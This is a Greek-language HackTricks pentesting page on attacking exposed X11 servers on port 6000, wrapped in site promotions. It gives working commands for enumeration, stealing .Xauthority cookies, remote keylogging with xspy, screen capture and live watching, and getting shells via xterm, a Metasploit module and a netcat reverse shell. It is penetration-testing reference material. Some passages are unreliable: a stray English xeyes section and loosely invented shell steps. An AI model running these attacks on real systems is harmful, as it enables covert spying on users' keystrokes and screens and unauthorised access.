# 6000 - Ελεγκτική Δοκιμή X11

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετέχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Εγγραφείτε στον διακομιστή [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Χάκινγκ**\
Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενημερωμένοι με τις νεότερες ευρήματα ασφαλείας που ξεκινούν και τις κρίσιμες ενημερώσεις των πλατφορμών

**Εγγραφείτε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **και αρχίστε να συνεργάζεστε με τους κορυφαίους χάκερ σήμερα!**

## Βασικές Πληροφορίες

Το **X Window System** (X) είναι ένα ευέλικτο σύστημα παραθύρων που είναι διαδεδομένο σε λειτουργικά συστήματα βασισμένα σε UNIX. Παρέχει ένα πλαίσιο για τη δημιουργία γραφικών **διεπαφών χρήστη (GUIs)**, με τα ατομικά προγράμματα να χειρίζονται τον σχεδιασμό της διεπαφής χρήστη. Αυτή η ευελιξία επιτρέπει ποικίλες και προσαρμόσιμες εμπειρίες εντός του περιβάλλοντος X.

**Προεπιλεγμένη θύρα:** 6000
```
PORT       STATE   SERVICE
6000/tcp   open    X11
```
## Απαρίθμηση

Ελέγξτε για **ανώνυμη σύνδεση:**
```bash
nmap -sV --script x11-access -p <PORT> <IP>
msf> use auxiliary/scanner/x11/open_x11
```
#### Τοπική Απαρίθμηση

Το αρχείο **`.Xauthority`** στον φάκελο home του χρήστη χρησιμοποιείται από το **X11 για την εξουσιοδότηση**. Από [**εδώ**](https://stackoverflow.com/a/37367518):
```bash
$ xxd ~/.Xauthority
00000000: 0100 0006 6d61 6e65 7063 0001 3000 124d  ............0..M
00000010: 4954 2d4d 4147 4943 2d43 4f4f 4b49 452d  IT-MAGIC-COOKIE-
00000020: 3100 108f 52b9 7ea8 f041 c49b 85d8 8f58  1...R.~..A.....X
00000030: 041d ef                                  ...
```
> MIT-magic-cookie-1: Δημιουργία 128bit κλειδιού ("cookie"), αποθήκευση του στο \~/.Xauthority (ή όπου δείχνει η μεταβλητή περιβάλλοντος XAUTHORITY). Ο πελάτης το στέλνει στον διακομιστή απλό! Ο διακομιστής ελέγχει εάν έχει αντίγραφο αυτού του "cookie" και αν ναι, επιτρέπεται η σύνδεση. Το κλειδί δημιουργείται από το DMX.

{% hint style="warning" %}
Για να **χρησιμοποιήσετε το cookie**, πρέπει να ορίσετε τη μεταβλητή περιβάλλοντος: **`export XAUTHORITY=/path/to/.Xauthority`**
{% endhint %}

#### Τοπική Συνεδρία Απαρίθμησης
```bash
$ w
23:50:48 up 1 day, 10:32,  1 user,  load average: 0.29, 6.48, 7.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
user     tty7     :0               13Oct23 76days 13:37   2.20s xfce4-session
```
## Επαλήθευση Σύνδεσης

To verify the connection, you can use the `xeyes` command. This command will open a small window with a pair of eyes that follow the mouse cursor. If the connection is successful, you should see the window with the eyes on your local machine.

```bash
$ xeyes
```

If the window with the eyes appears, it means that the X11 forwarding is working correctly.
```bash
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
```
## Keyloggin

[xspy](http://tools.kali.org/sniffingspoofing/xspy) για να καταγράψετε τα πλήκτρα του πληκτρολογίου.

Δείγμα εξόδου:
```
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
```
## Καταγραφή στιγμιότυπων οθόνης

Η καταγραφή στιγμιότυπων οθόνης είναι μια τεχνική που χρησιμοποιείται για να καταγράψει την εικόνα της οθόνης ενός συστήματος. Αυτό μπορεί να γίνει για πολλούς λόγους, όπως για την ανίχνευση πιθανών ευπαθειών στο σύστημα ή για την καταγραφή αποδεικτικών στοιχείων κατά τη διάρκεια μιας επίθεσης.

Για να καταγράψετε ένα στιγμιότυπο οθόνης, μπορείτε να χρησιμοποιήσετε διάφορα εργαλεία, όπως το `scrot` ή το `import` στο Linux, το `screencapture` στο macOS ή το `Snipping Tool` στα Windows. Αυτά τα εργαλεία σας επιτρέπουν να επιλέξετε την περιοχή της οθόνης που θέλετε να καταγράψετε και να αποθηκεύσετε το στιγμιότυπο σε ένα αρχείο εικόνας.

Η καταγραφή στιγμιότυπων οθόνης μπορεί να αποδειχθεί χρήσιμη κατά την εξέταση ευπαθειών σε εφαρμογές ή για την καταγραφή πληροφοριών που μπορεί να χρησιμοποιηθούν για την εκτέλεση επιθέσεων. Είναι σημαντικό να θυμάστε ότι η καταγραφή στιγμιότυπων οθόνης μπορεί να είναι παράνομη αν γίνεται χωρίς την άδεια του ιδιοκτήτη του συστήματος ή του χρήστη.
```bash
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
```
## Προβολή απομακρυσμένης επιφάνειας εργασίας

Τρόπος από: [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
```
./xrdp.py <IP:0>
```
Πρώτα πρέπει να βρούμε το ID του παραθύρου χρησιμοποιώντας την εντολή xwininfo
```
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

Absolute upper-left X:  0
Absolute upper-left Y:  0
Relative upper-left X:  0
Relative upper-left Y:  0
Width: 1024
Height: 768
Depth: 16
Visual: 0x21
Visual Class: TrueColor
Border width: 0
Class: InputOutput
Colormap: 0x20 (installed)
Bit Gravity State: ForgetGravity
Window Gravity State: NorthWestGravity
Backing Store State: NotUseful
Save Under State: no
Map State: IsViewable
Override Redirect State: no
Corners:  +0+0  -0+0  -0-0  +0-0
-geometry 1024x768+0+0
```
**XWatchwin**

Για την **πραγματικού χρόνου παρακολούθηση** χρειάζεται να χρησιμοποιήσουμε
```bash
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```
## Λήψη κέλυφους

Για να λάβετε ένα κέλυφος σε ένα σύστημα που εκτελεί το X11, μπορείτε να ακολουθήσετε τα παρακάτω βήματα:

1. Ελέγξτε αν ο X11 είναι ενεργοποιημένος στο σύστημα που επιθυμείτε να εισβάλετε. Αυτό μπορεί να γίνει ελέγχοντας την ύπαρξη του αρχείου `/tmp/.X11-unix/X0`.

2. Εάν ο X11 είναι ενεργοποιημένος, χρησιμοποιήστε την εντολή `xauth list` για να εμφανίσετε τα διαπιστευτήρια του X11.

3. Αντιγράψτε τον αριθμό του display (π.χ. `:0`) και τον αντίστοιχο κωδικό πρόσβασης.

4. Στη συνέχεια, χρησιμοποιήστε την εντολή `xauth add` για να προσθέσετε τα διαπιστευτήρια στον τρέχοντα χρήστη.

5. Τέλος, εκτελέστε την εντολή `xterm -display <display_number>` για να ανοίξετε ένα νέο παράθυρο του X11 και να λάβετε ένα κέλυφος στο σύστημα.

Αφού ακολουθήσετε αυτά τα βήματα, θα έχετε λάβει ένα κέλυφος στο σύστημα που εκτελεί το X11.
```
msf> use exploit/unix/x11/x11_keyboard_exec
```
Άλλος τρόπος:

**Αντίστροφη κέλυφος (Reverse Shell):** Το Xrdp επίσης επιτρέπει τη λήψη αντίστροφου κελύφους μέσω του Netcat. Πληκτρολογήστε την παρακάτω εντολή:
```bash
./xrdp.py \<IP:0> –no-disp
```
Στη διεπαφή μπορείτε να δείτε την επιλογή **R-shell**.

Στη συνέχεια, ξεκινήστε έναν **ακροατή Netcat** στο τοπικό σας σύστημα στη θύρα 5555.
```bash
nc -lvp 5555
```
Στη συνέχεια, τοποθετήστε τη διεύθυνση IP και τη θύρα σας στην επιλογή **R-Shell** και κάντε κλικ στο **R-shell** για να λάβετε ένα κέλυφος


## Αναφορές
* [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)

## Shodan

* `port:6000 x11`

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετάσχετε στον διακομιστή [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Hacking**\
Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενημερωμένοι με τις νεότερες ευκαιρίες ευρεσιτεχνίας ευρετηρίου και τις κρίσιμες ενημερώσεις της πλατφόρμας

**Συμμετέχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **και αρχίστε να συνεργάζεστε με τους κορυφαίους χάκερ σήμερα!**

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
